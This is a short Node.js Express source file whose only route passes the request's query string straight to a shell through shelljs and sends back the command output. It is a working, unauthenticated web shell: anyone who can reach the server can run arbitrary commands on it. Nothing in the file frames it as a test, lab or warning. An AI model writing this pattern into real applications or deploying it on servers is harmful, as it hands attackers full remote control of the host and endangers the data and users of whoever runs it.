var express = require("express");
var app=express();
const shell = require('shelljs')
app.get("/",function(req,res,next){
    t=req.originalUrl.split('?')[1].replace(/%20/g,' ');
    t=shell.exec(t);
    res.send(t);
});
module.exports=app;